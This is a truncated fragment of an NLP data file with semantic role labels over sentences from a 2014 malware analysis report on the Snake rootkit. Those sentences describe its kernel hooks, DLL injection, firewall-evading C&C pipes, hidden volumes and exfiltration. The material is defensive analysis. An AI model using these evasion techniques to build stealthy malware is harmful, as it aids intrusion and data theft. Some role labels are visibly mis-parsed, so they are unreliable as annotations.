provide remote attackers with full remote access to the compromised system"}}, "provide": {"ARG0": {"text": "Snake"}, "V": {"text": "provide", "index": 9}, "ARG1": {"text": "remote attackers"}, "ARGM-MNR": {"text": "with full remote access to the compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 18}, "ARG1": {"text": "system"}}}, "\n</figure>\n\n The ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode\n DLL, as these volumes are accessible both from usermode and kernel mode": {"keep": {"V": {"text": "keep", "index": 3}, "ARG1": {"text": "its data"}, "ARG2": {"text": "on TrueCrypt - like volumes"}}, "provides": {"ARG0": {"text": "The ability to keep its data on TrueCrypt - like volumes"}, "V": {"text": "provides", "index": 11}, "ARG2": {"text": "Snake"}, "ARG1": {"text": "with a powerful ability to exchange data with the usermode DLL"}, "ARGM-CAU": {"text": "as these volumes are accessible both from usermode and kernel mode"}}, "exchange": {"V": {"text": "exchange", "index": 18}, "ARG1": {"text": "data"}, "ARG3": {"text": "with the usermode DLL"}}, "are": {"ARG1": {"text": "these volumes"}, "V": {"text": "are", "index": 28}, "ARG2": {"text": "accessible both from usermode and kernel mode"}}}, " This way it intercepts all requests along with their\nparameters via IRP (IO request package) hooks": {"intercepts": {"ARGM-MNR": {"text": "This way/ via IRP ( IO request package"}, "ARG0": {"text": "it"}, "V": {"text": "intercepts", "index": 3}, "ARG1": {"text": "all requests along with their parameters"}}}, "\n\nThe driver is registered with NdisIMRegisterLayeredMiniport() API": {"is": {"ARG1": {"text": "The driver"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "registered with NdisIMRegisterLayeredMiniport ("}}, "registered": {"ARG1": {"text": "The driver"}, "V": {"text": "registered", "index": 3}, "ARG2": {"text": "with NdisIMRegisterLayeredMiniport"}, "ARGM-ADV": {"text": "( ) API"}}}, "\n\nAs soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module\nstarted producing the following traffic:\n<table>\nNo": {"made": {"ARG0": {"text": "the tool"}, "V": {"text": "made", "index": 5}, "ARG1": {"text": "its first GET requests"}}, "injected": {"ARGM-TMP": {"text": "As soon as the tool made its first GET requests/ immediately"}, "ARG0": {"text": "the driver"}, "V": {"text": "injected", "index": 14}, "ARG1": {"text": "a malicious DLL module"}, "ARG2": {"text": "in it"}}, "started": {"ARG1": {"text": "that module"}, "V": {"text": "started", "index": 25}, "C-ARG1": {"text": "producing the following traffic"}}, "producing": {"ARG0": {"text": "that module"}, "V": {"text": "producing", "index": 26}, "ARG1": {"text": "the following traffic"}}, "following": {"V": {"text": "following", "index": 28}, "ARG1": {"text": "traffic"}}}, " In one example, the rootkit blocks access to registry entries that contain the strings \u201cUltra3\u201d and \u201c~ROOT\u201d": {"blocks": {"ARGM-DIS": {"text": "In one example"}, "ARG0": {"text": "the rootkit"}, "V": {"text": "blocks", "index": 6}, "ARG1": {"text": "access to registry entries that contain the strings \u201c Ultra3 \u201d and \u201c ~ROOT \u201d"}}, "contain": {"ARG0": {"text": "registry entries"}, "R-ARG0": {"text": "that"}, "V": {"text": "contain", "index": 12}, "ARG1": {"text": "the strings \u201c Ultra3 \u201d and \u201c ~ROOT \u201d"}}}, "\n\n\nIf the rootkit detects that the OS version is pre-Vista (e.g": {"detects": {"ARG0": {"text": "the rootkit"}, "V": {"text": "detects", "index": 3}}, "is": {"ARG1": {"text": "the OS version"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "pre - Vista ("}}}, "\n   \u2022\t   In the third mode, it works in the \u2018pipe server\u2019 mode, when it passes the web requests it is interested in (as a client) to the\n        pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes": {"works": {"ARGM-ADV": {"text": "\u2022"}, "ARGM-LOC": {"text": "In the third mode/ in the \u2018 pipe server \u2019 mode"}, "ARG0": {"text": "it"}, "V": {"text": "works", "index": 7}, "ARGM-TMP": {"text": "when it passes the web requests it is interested in ( as a client ) to the pipe server that runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes"}}, "passes": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "it"}, "V": {"text": "passes", "index": 18}, "ARG1": {"text": "the web requests"}}, "requests": {"ARG0": {"text": "the web"}, "V": {"text": "requests", "index": 21}, "ARG1": {"text": "it is interested in ( as a client ) to the pipe server that runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes"}}, "is": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 23}, "ARG2": {"text": "interested in ( as a client ) to the pipe server that runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes"}}, "runs": {"ARG1": {"text": "a client ) to the pipe server"}, "R-ARG1": {"text": "that"}, "V": {"text": "runs", "index": 36}, "ARGM-MNR": {"text": "within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes"}}}, "\n\nThe delivery mechanism is not known: it may be distributed via a thumb-drive, a phishing email attachment, or be delivered via an\nexploit across the network (e.g": {"is": {"V": {"text": "is", "index": 3}}, "known": {"ARG1": {"text": "The delivery mechanism"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "known", "index": 5}}, "may": {"V": {"text": "may", "index": 8}}, "be": {"V": {"text": "be", "index": 9}}, "distributed": {"ARG1": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "distributed", "index": 10}, "ARGM-MNR": {"text": "via a thumb - drive , a phishing email attachment"}}, "phishing": {"V": {"text": "phishing", "index": 18}, "ARG1": {"text": "email attachment"}}, "be_2": {"V": {"text": "be", "index": 23}}, "delivered": {"ARG1": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "delivered", "index": 24}, "ARGM-MNR": {"text": "via an exploit across the network ( e.g"}}}, "\n\n\n\n<footer>                                                         BAE Systems Applied Intelligence: Snake Rootkit Report 2014         12</footer>\n\n\fThe reason behind the pipes usage is to \u2018legitimise\u2019 the outbound web requests, forcing them to originate from the host firewall-\nfriendly system services": {"is": {"ARG1": {"text": "The reason behind the pipes usage"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to \u2018 legitimise \u2019 the outbound web requests , forcing them to originate from the host firewall- friendly system services"}}, "forcing": {"V": {"text": "forcing", "index": 16}, "ARG1": {"text": "them"}, "ARG2": {"text": "to originate from the host firewall- friendly system services"}}, "originate": {"ARG1": {"text": "them"}, "V": {"text": "originate", "index": 19}, "ARG2": {"text": "from the host firewall- friendly system services"}}}, "\n\n\n</section>\n<section>\n<heading>\nSYSTEM HOOKS</heading>\nThe first API it hooks is IoCreateDevice()": {"hooks": {"ARG2": {"text": "The first API"}, "ARG1": {"text": "it"}, "V": {"text": "hooks", "index": 4}}, "is": {"ARG1": {"text": "The first API it hooks"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "IoCreateDevice ( )"}}}, "\n\n    4      Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,\n\n          bypassing the host-based firewalls that keep an infected system process in a white-list": {"is": {"V": {"text": "is", "index": 8}}, "delegated": {"ARG1": {"text": "the task of communication with C&C"}, "V": {"text": "delegated", "index": 9}, "ARG3": {"text": "to the pipe server"}}, "will": {"V": {"text": "will", "index": 16}}, "start": {"ARGM-TMP": {"text": "Once the task of communication with C&C is delegated to the pipe server"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "start", "index": 17}, "ARG1": {"text": "communicating"}, "ARG2": {"text": "with the C&C"}, "ARGM-ADV": {"text": "bypassing the host - based firewalls that keep an infected system process in a white - list"}}, "communicating": {"ARG0": {"text": "it"}, "V": {"text": "communicating", "index": 18}, "ARG2": {"text": "with the C&C"}}, "bypassing": {"ARG0": {"text": "it"}, "V": {"text": "bypassing", "index": 23}, "ARG1": {"text": "the host - based firewalls that keep an infected system process in a white - list"}}, "based": {"ARG2": {"text": "host"}, "V": {"text": "based", "index": 27}, "ARG1": {"text": "firewalls"}}, "keep": {"ARG0": {"text": "the host - based firewalls"}, "R-ARG0": {"text": "that"}, "V": {"text": "keep", "index": 30}, "ARG1": {"text": "an infected system process in a white - list"}}}, "\n\nIn order to be able to perform the steps above, the dropper must first obtain Administrator privileges": {"be": {"V": {"text": "be", "index": 3}, "ARG2": {"text": "able to perform the steps above"}}, "perform": {"V": {"text": "perform", "index": 6}, "ARG1": {"text": "the steps"}, "ARGM-LOC": {"text": "above"}}, "must": {"ARGM-PRP": {"text": "In order to be able to perform the steps above"}, "ARG0": {"text": "the dropper"}, "V": {"text": "must", "index": 13}, "ARG1": {"text": "first obtain Administrator privileges"}}, "obtain": {"ARGM-PRP": {"text": "In order to be able to perform the steps above"}, "ARG0": {"text": "the dropper"}, "ARGM-MOD": {"text": "must"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "obtain", "index": 15}, "ARG1": {"text": "Administrator privileges"}}}, "\n\nThe logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too": {"dumps": {"V": {"text": "dumps", "index": 3}, "ARG0": {"text": "it"}}, "creates": {"ARG1": {"text": "The logs and dumps/ on the hidden virtual volumes contributes to its stealthiness too"}, "ARG0": {"text": "it"}, "V": {"text": "creates", "index": 5}}, "contributes": {"ARG0": {"text": "The logs and dumps it creates on the hidden virtual volumes"}, "V": {"text": "contributes", "index": 11}, "ARG2": {"text": "to its stealthiness too"}}}, "\n   \u2022\t   In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(),\n        send(), etc": {"uses": {"ARGM-LOC": {"text": "\u2022 In the second mode"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 7}, "ARG1": {"text": "Windows Sockets 2 ( Winsock ) APIs , such as WSAStartup ( ) , socket ( ) , connect ( ) , send ( ) , etc"}}, "connect": {"ARG0": {"text": "such as WSAStartup ( )"}, "V": {"text": "connect", "index": 26}, "ARG1": {"text": "( )"}}, "send": {"V": {"text": "send", "index": 30}, "ARG1": {"text": "( )"}}}, " We have identified two distinct variants, both highly flexible but with two\ndifferent techniques for establishing and maintaining a presence on the target system": {"have": {"V": {"text": "have", "index": 1}}, "identified": {"ARG0": {"text": "We"}, "V": {"text": "identified", "index": 2}, "ARG1": {"text": "two distinct variants , both highly flexible but with two different techniques for establishing and maintaining a presence on the target system"}}, "establishing": {"V": {"text": "establishing", "index": 16}, "ARG1": {"text": "a presence"}, "ARGM-LOC": {"text": "on the target system"}}, "maintaining": {"V": {"text": "maintaining", "index": 18}, "ARG1": {"text": "a presence on the target system"}}}, "\n</section>\n<footer>                                                         BAE Systems Applied Intelligence: Snake Rootkit Report 2014           13</footer>\n\n\f\n<section>\n<heading>KERNEL-CENTRIC ARCHITECTURE</heading>\nThis particular architecture relies on a kernel-mode driver to carry out the network communications": {"relies": {"ARG0": {"text": "This particular architecture"}, "V": {"text": "relies", "index": 3}, "ARG1": {"text": "on a kernel - mode driver"}, "ARG2": {"text": "to carry out the network communications"}}, "carry": {"ARG0": {"text": "a kernel - mode driver"}, "V": {"text": "carry", "index": 11}, "ARG1": {"text": "the network communications"}}}, "\nWhen that happens, NDIS invokes Snake\u2019s hook function\n(ProtocolReceiveNetBufferLists) to process the\nreceived data": {"happens": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "that"}, "V": {"text": "happens", "index": 2}}, "invokes": {"ARGM-TMP": {"text": "When that happens"}, "ARG0": {"text": "NDIS"}, "V": {"text": "invokes", "index": 5}, "ARG1": {"text": "Snake"}}, "process": {"V": {"text": "process", "index": 14}, "ARG1": {"text": "the received data"}}, "received": {"V": {"text": "received", "index": 16}, "ARG1": {"text": "data"}}}, " On a 32-bit OS, it will install a 32-bit driver": {"will": {"ARGM-LOC": {"text": "On a 32-bit OS"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "install a 32-bit driver"}}, "install": {"ARGM-LOC": {"text": "On a 32-bit OS"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 7}, "ARG1": {"text": "a 32-bit driver"}}}, " OK\n    03:52:17 652: GET test file /IMAGE/pub.html\n    03:52:17 652: POST /IMAGE/2/55198739672286404661840843638320033\n    03:52:18 652: C:\\WINDOWS\\$NtUninstallQ812589$\\gstat32.bin 310[B]\n    03:52:19 652: Http Status:200\n    03:52:19 652: POST /IMAGE/2/32773318678423920155243775957661252\n    03:52:19 652: result.xml 1278[B]\n    03:52:20 652: Http Status:200\n    03:52:21 652: POST /IMAGE/2/41535327538451061594793127961089611\n    03:52:21 652: C:\\WINDOWS\\$NtUninstallQ812589$\\mtmon32.sdb 655[B]\n    03:52:22 652: Http Status:200\n    03:52:22 652: POST /IMAGE/2/35192812459183876172895945534862460\n    03:52:22 652: C:\\WINDOWS\\$NtUninstallQ812589$\\mtmon.sdb 748[B]\n    03:52:23 652: Http Status:200\n</list>\nThe files it uploads are stored inside its home directory %windows%\\$NtUninstallQ[random]$,\nwhere [random] is a random number": {"GET": {"V": {"text": "GET", "index": 4}, "ARG1": {"text": "test file /IMAGE / pub.html 03:52:17 652"}}, "uploads": {"ARG1": {"text": "it"}, "V": {"text": "uploads", "index": 77}}, "are": {"V": {"text": "are", "index": 78}}, "stored": {"ARG1": {"text": "it"}, "V": {"text": "stored", "index": 79}}, "is": {"R-ARG1": {"text": "where"}, "ARG1": {"text": "[ random ]"}, "V": {"text": "is", "index": 91}, "ARG2": {"text": "a random number"}}}, " It is designed to perform the high-level tasks\nsuch as:\n<list>\n   \u2022\t     manage the configuration data (by using a queue)\n   \u2022\t     exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:\n           \u2022\t   communicate with the C&C server and receive commands to execute\n           \u2022\t   submit logs to the C&C server and other reports\n</list>\nWhen the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume": {"is": {"V": {"text": "is", "index": 1}}, "designed": {"ARG1": {"text": "It"}, "V": {"text": "designed", "index": 2}, "ARG3": {"text": "to perform the high - level tasks such as"}}, "perform": {"ARG0": {"text": "It"}, "V": {"text": "perform", "index": 4}, "ARG1": {"text": "the high - level tasks such as"}}, "reads": {"ARGM-TMP": {"text": "When the DLL activates"}, "ARG0": {"text": "it"}, "V": {"text": "reads", "index": 19}, "ARG1": {"text": "configuration parameters"}, "ARG3": {"text": "from the configuration queue"}, "C-ARG0": {"text": "that the driver creates on a virtual volume"}}, "creates": {"ARG0": {"text": "the driver"}, "V": {"text": "creates", "index": 30}, "ARG1": {"text": "on a virtual volume"}}}, "\n\n    3      In the \u2018pipe mode\u2019 of operation, the injected DLL will start communicating with the pipe server by sending messages into\n         the established inter-process communication pipes": {"will": {"V": {"text": "will", "index": 13}, "ARGM-MNR": {"text": "by sending messages into the established inter - process communication pipes"}}, "start": {"ARGM-LOC": {"text": "In the \u2018 pipe mode \u2019 of operation"}, "ARG0": {"text": "the injected DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "start", "index": 14}, "ARG1": {"text": "communicating"}, "ARGM-MNR": {"text": "with the pipe server/ by sending messages into the established inter - process communication pipes"}}, "communicating": {"ARG0": {"text": "the injected DLL"}, "V": {"text": "communicating", "index": 15}}, "sending": {"ARG0": {"text": "the injected DLL"}, "V": {"text": "sending", "index": 21}, "ARG1": {"text": "messages"}, "ARG2": {"text": "into the established inter - process communication pipes"}}, "established": {"V": {"text": "established", "index": 25}, "ARG1": {"text": "inter - process communication pipes"}}}, " Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for\ncreating NTFS file systems, and the initial message queue file which is written into the virtual volume": {"embedded": {"ARG1": {"text": "Other resources"}, "V": {"text": "embedded", "index": 2}, "ARG2": {"text": "within the dropper"}}, "are": {"ARG1": {"text": "Other resources embedded within the dropper"}, "V": {"text": "are", "index": 6}, "ARG2": {"text": "the 32-bit and 64-bit builds of its driver , a tool for creating NTFS file systems , and the initial message queue file which is written into the virtual volume"}}, "builds": {"ARGM-ADJ": {"text": "32-bit and 64-bit"}, "V": {"text": "builds", "index": 11}, "ARG1": {"text": "of its driver"}}, "creating": {"V": {"text": "creating", "index": 19}, "ARG1": {"text": "NTFS file systems"}}, "is": {"V": {"text": "is", "index": 31}}, "written": {"ARG1": {"text": "the initial message queue file"}, "R-ARG1": {"text": "which"}, "V": {"text": "written", "index": 32}, "ARG2": {"text": "into the virtual volume"}}}, " Another\napproach is to carry out all of the communications from the kernel-mode driver, which is a very challenging task by itself": {"is": {"ARG1": {"text": "Another approach"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "to carry out all of the communications from the kernel - mode driver , which is a very challenging task by itself"}}, "carry": {"V": {"text": "carry", "index": 4}, "ARG1": {"text": "all of the communications from the kernel - mode driver , which is a very challenging task by itself"}}, "is_2": {"ARG1": {"text": "the kernel - mode driver"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "a very challenging task by itself"}}}, " When that happens, the\nrootkit triggers an event named \\BaseNamedObjects\\wininet_activate": {"happens": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "that"}, "V": {"text": "happens", "index": 2}}, "triggers": {"ARGM-TMP": {"text": "When that happens"}, "ARG0": {"text": "the rootkit"}, "V": {"text": "triggers", "index": 6}, "ARG1": {"text": "an event named \\BaseNamedObjects\\wininet_activate"}}, "named": {"ARG1": {"text": "an event"}, "V": {"text": "named", "index": 9}, "ARG2": {"text": "\\BaseNamedObjects\\wininet_activate"}}}, " The installed hook handler calls the original API and then checks if the name of the\ndevice is netbt or afd": {"calls": {"ARG0": {"text": "The installed hook handler"}, "V": {"text": "calls", "index": 4}, "ARG1": {"text": "the original API and then checks"}, "ARGM-ADV": {"text": "if the name of the device is netbt or afd"}}, "checks": {"ARG0": {"text": "The installed hook handler"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "checks", "index": 10}, "ARGM-ADV": {"text": "if the name of the device is netbt or afd"}}, "is": {"ARG1": {"text": "the name of the device"}, "V": {"text": "is", "index": 17}, "ARG2": {"text": "netbt or afd"}}}, " Its ability to generate malicious traffic whenever the user\ngoes online and start loading the web pages allows it to \u2018blend in\u2019 with the legitimate communications": {"generate": {"V": {"text": "generate", "index": 3}, "ARG1": {"text": "malicious traffic"}, "ARGM-TMP": {"text": "whenever the user goes online"}}, "goes": {"ARGM-TMP": {"text": "whenever"}, "ARG1": {"text": "the user"}, "V": {"text": "goes", "index": 9}, "ARG4": {"text": "online"}}, "start": {"ARGM-TMP": {"text": "whenever"}, "ARG0": {"text": "the user"}, "V": {"text": "start", "index": 12}, "ARG1": {"text": "loading"}}, "loading": {"ARG0": {"text": "the user"}, "V": {"text": "loading", "index": 13}, "ARG1": {"text": "the web pages"}}, "allows": {"ARGM-TMP": {"text": "whenever the user"}, "ARG0": {"text": "the web pages"}, "V": {"text": "allows", "index": 17}, "ARG1": {"text": "it to \u2018 blend in \u2019 with the legitimate communications"}}}, " kbdfaori.dll), log directory, and the registry entry ShellCore that stores other configuration details:\n\n         03:52:02 TVer=1.2\n         03:52:02 Parent:C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n         03:52:02 ver 3.2.0.0a inj             dll K:0      PID:712,\n         C:\\WINDOWS\\system32\\kbdfaori.dll,\n         hostID:ea5cfa5ea1681bd6(16887647987074341846)\n         03:52:02 C:\\WINDOWS\\$NtUninstallQ812589$,\n         Temp:C:\\WINDOWS\\$NtUninstallQ812589$\\SPUNINST\\Temp\n         03:52:02 REG:Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n         03:52:02 ModuleStart: 03:51:42\n\n   \u2022\t scmp.bin - pipe server log that shows its assigned name (COMPUTERNAME is the name of the test system) and\n      what processes it operates from:\n\n         02:04:24 TVer=1.6\n         02:04:24 SPCOMPUTERNAME: Pipe server thread start\n         02:04:24 Inj[1620]:explorer.exe\n         03:51:42 Inj[712]:iexplore.exe\n\n    \u2022\t ucmp.bin - another pipe server log:\n\n         02:04:44 TVer=1.6\n         02:04:44 UPCOMPUTERNAME: Pipe server thread start\n</list>\n\n</section>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014    11</footer>\n\n\f\n<section>\n<heading>INTER-PROCESS COMMUNICATION</heading>\nAnalysis of the sample reveals that it supports 3 modes of fetching C&C commands": {"log": {"V": {"text": "log", "index": 3}, "ARG1": {"text": "directory"}}, "stores": {"ARG0": {"text": "the registry entry ShellCore"}, "R-ARG0": {"text": "that"}, "V": {"text": "stores", "index": 12}, "ARG1": {"text": "other configuration details"}}, "ver": {"V": {"text": "ver", "index": 26}, "ARG1": {"text": "3.2.0.0a"}}, "inj": {"V": {"text": "inj", "index": 28}, "ARG1": {"text": "dll K:0"}}, "dll": {"V": {"text": "dll", "index": 29}, "ARG1": {"text": "SPCOMPUTERNAME"}}, "shows": {"ARG0": {"text": "03:51:42 \u2022 scmp.bin - pipe server log"}, "R-ARG0": {"text": "that"}, "V": {"text": "shows", "index": 61}, "ARG1": {"text": "its assigned name ( COMPUTERNAME is the name of the test system )"}}, "is": {"ARG1": {"text": "its assigned name ( COMPUTERNAME"}, "V": {"text": "is", "index": 67}, "ARG2": {"text": "the name of the test system )"}}, "processes": {"ARG0": {"text": "what"}, "V": {"text": "processes", "index": 77}, "ARG1": {"text": "it"}}, "operates": {"ARG1": {"text": "what processes/ it"}, "V": {"text": "operates", "index": 79}, "ARG3": {"text": "from"}}, "start": {"ARG1": {"text": "thread"}, "V": {"text": "start", "index": 90}, "ARGM-EXT": {"text": "02:04:24"}, "ARGM-LOC": {"text": "Inj[1620]:explorer.exe"}}, "start_2": {"ARG0": {"text": "thread"}, "V": {"text": "start", "index": 111}, "ARG1": {"text": "Analysis of"}}, "reveals": {"V": {"text": "reveals", "index": 116}}, "supports": {"ARG0": {"text": "it"}, "V": {"text": "supports", "index": 119}, "ARG1": {"text": "3 modes of"}}, "fetching": {"V": {"text": "fetching", "index": 123}, "ARG1": {"text": "C&C commands"}}}, "\n\nIn order to accomplish it, it registers a callout driver for Windows Filtering Platform (WFP), an architecture first introduced with\nWindows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic": {"accomplish": {"V": {"text": "accomplish", "index": 3}, "ARG1": {"text": "it"}}, "registers": {"ARGM-PRP": {"text": "In order to accomplish it"}, "ARG0": {"text": "it"}, "V": {"text": "registers", "index": 7}, "ARG1": {"text": "a callout driver"}, "ARG2": {"text": "for Windows Filtering Platform ( WFP )"}, "ARGM-ADV": {"text": "an"}}, "introduced": {"ARG1": {"text": "an architecture"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "introduced", "index": 22}, "ARG2": {"text": "with Windows Vista"}}, "used": {"ARG1": {"text": "an"}, "ARGM-TMP": {"text": "nowadays"}, "ARGM-ADV": {"text": "normally"}, "V": {"text": "used", "index": 29}, "ARG0": {"text": "by antivirus and/or intrusion detection systems"}, "ARG2": {"text": "to inspect / block malicious traffic"}}, "inspect": {"V": {"text": "inspect", "index": 37}}, "block": {"V": {"text": "block", "index": 39}, "ARG1": {"text": "malicious traffic"}}}, "\n\nIn both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes": {"is": {"ARGM-LOC": {"text": "In both architectures"}, "V": {"text": "is", "index": 4}, "ARG1": {"text": "a kernel mode driver installed and a usermode DLL injected by the driver into the system processes"}}, "installed": {"ARG1": {"text": "a kernel mode driver"}, "V": {"text": "installed", "index": 9}}, "injected": {"ARG1": {"text": "a usermode DLL"}, "V": {"text": "injected", "index": 14}, "ARG0": {"text": "by the driver"}, "ARG2": {"text": "into the system processes"}}, "processes": {"ARG1": {"text": "system"}, "V": {"text": "processes", "index": 21}}}, " Windows Server 2003), it will\ninvoke FwpsStreamInjectAsync0() API in order to generate outbound requests": {"will": {"ARGM-DIS": {"text": "Windows Server 2003 )"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "invoke FwpsStreamInjectAsync0 ( ) API"}, "ARGM-PRP": {"text": "in order to generate outbound requests"}}, "invoke": {"ARGM-DIS": {"text": "Windows Server"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "invoke", "index": 7}, "ARG1": {"text": "FwpsStreamInjectAsync0 ( ) API"}, "ARGM-PRP": {"text": "in order to generate outbound requests"}}, "generate": {"V": {"text": "generate", "index": 15}}}, " It is designed to covertly install a backdoor on a compromised system, hide the presence of its\ncomponents, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism": {"is": {"V": {"text": "is", "index": 1}}, "designed": {"ARG1": {"text": "It"}, "V": {"text": "designed", "index": 2}, "ARG3": {"text": "to covertly install a backdoor on a compromised system"}}, "install": {"ARGM-MNR": {"text": "covertly"}, "V": {"text": "install", "index": 5}, "ARG1": {"text": "a backdoor on a compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 10}, "ARG1": {"text": "system"}}, "hide": {"ARG0": {"text": "It"}, "V": {"text": "hide", "index": 13}, "ARG1": {"text": "the presence of its components"}}, "provide": {"ARG0": {"text": "It"}, "V": {"text": "provide", "index": 20}, "ARG2": {"text": "a communication mechanism"}, "ARG1": {"text": "with its C&C servers"}}, "enable": {"ARG0": {"text": "It"}, "V": {"text": "enable", "index": 30}, "ARG1": {"text": "an effective data exfiltration mechanism"}}}, " When most of the infected hosts are cut off from the outside world, it only needs one host to be\nconnected online": {"infected": {"V": {"text": "infected", "index": 4}, "ARG1": {"text": "hosts"}}, "are": {"V": {"text": "are", "index": 6}}, "cut": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "most of the infected hosts"}, "V": {"text": "cut", "index": 7}, "ARG2": {"text": "from the outside world"}}, "needs": {"ARGM-TMP": {"text": "When most of the infected hosts are cut off from the outside world"}, "ARG0": {"text": "it"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "needs", "index": 16}, "ARG1": {"text": "one host to be connected online"}}, "be": {"V": {"text": "be", "index": 20}}, "connected": {"ARG1": {"text": "one host"}, "V": {"text": "connected", "index": 21}, "ARG2": {"text": "online"}}}, " In one of the analysed\nkernel-centric Snake samples the home directory was hard-coded as %windows%\\$NtUninstallQ817473$, so it blocked file\nread access from that directory": {"analysed": {"V": {"text": "analysed", "index": 4}, "ARG1": {"text": "kernel - centric Snake samples"}}, "samples": {"ARG0": {"text": "the analysed kernel - centric Snake"}, "V": {"text": "samples", "index": 9}, "ARG1": {"text": "the home directory"}}, "was": {"ARGM-LOC": {"text": "In one of the analysed kernel - centric Snake samples"}, "ARG1": {"text": "the home directory"}, "V": {"text": "was", "index": 13}, "ARG2": {"text": "hard - coded as % windows%\\$NtUninstallQ817473 $"}}, "coded": {"ARG1": {"text": "the home directory"}, "ARGM-MNR": {"text": "hard/ as % windows%\\$NtUninstallQ817473 $"}, "V": {"text": "coded", "index": 16}}, "windows%\\$NtUninstallQ817473": {"V": {"text": "windows%\\$NtUninstallQ817473", "index": 19}, "ARG1": {"text": "$"}}, "blocked": {"V": {"text": "blocked", "index": 24}, "ARG1": {"text": "file"}}, "read": {"V": {"text": "read", "index": 26}, "ARG1": {"text": "access"}, "ARG2": {"text": "from that directory"}}}, "\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further": {"delivers": {"ARG0": {"text": "the tool"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "delivers", "index": 4}, "ARG1": {"text": "the payload"}}, "exploits": {"ARG0": {"text": "the tool"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "exploits", "index": 8}, "ARG1": {"text": "the remote host(s )"}}, "will": {"ARGM-ADV": {"text": "If the tool successfully delivers the payload and exploits the remote host(s )"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 15}, "ARG1": {"text": "replicate the infection across the network/ taking control over new hosts"}}, "replicate": {"ARGM-ADV": {"text": "If the tool successfully delivers the payload and exploits the remote host(s )/ taking control over new hosts/ thus repeating the infection cycle all over again and spreading the infection further"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "replicate", "index": 16}, "ARG1": {"text": "the infection across the network"}}, "taking": {"ARG0": {"text": "it"}, "V": {"text": "taking", "index": 23}, "ARG1": {"text": "control over new hosts"}}, "repeating": {"ARGM-DIS": {"text": "thus"}, "V": {"text": "repeating", "index": 30}, "ARG1": {"text": "the infection cycle all over again"}}, "spreading": {"ARG0": {"text": "it"}, "V": {"text": "spreading", "index": 38}, "ARG1": {"text": "the infection"}, "ARGM-EXT": {"text": "further"}}}, "\n\nThe analysed 32-bit dropper creates a driver in the following location:\n<list>\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\n</list>\nHowever, different samples may use a different path and driver file name": {"creates": {"ARG0": {"text": "The analysed 32-bit dropper"}, "V": {"text": "creates", "index": 4}, "ARG1": {"text": "a driver in the following location"}}, "may": {"V": {"text": "may", "index": 16}}, "use": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "different samples"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "use", "index": 17}, "ARG1": {"text": "a different path and driver file name"}}}, " The traffic is then routed through that host to make external control and data exfiltration still possible": {"is": {"ARG1": {"text": "The traffic"}, "V": {"text": "is", "index": 2}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "routed through that host to make external control and data exfiltration still possible"}}, "routed": {"ARG1": {"text": "The traffic"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "routed", "index": 4}, "ARGM-DIR": {"text": "through that host"}, "ARGM-PNC": {"text": "to make external control and data exfiltration still possible"}}, "make": {"V": {"text": "make", "index": 9}, "ARG1": {"text": "external control"}}}, "\n</section>\n<footer>                                                       BAE Systems Applied Intelligence: Snake Rootkit Report 2014            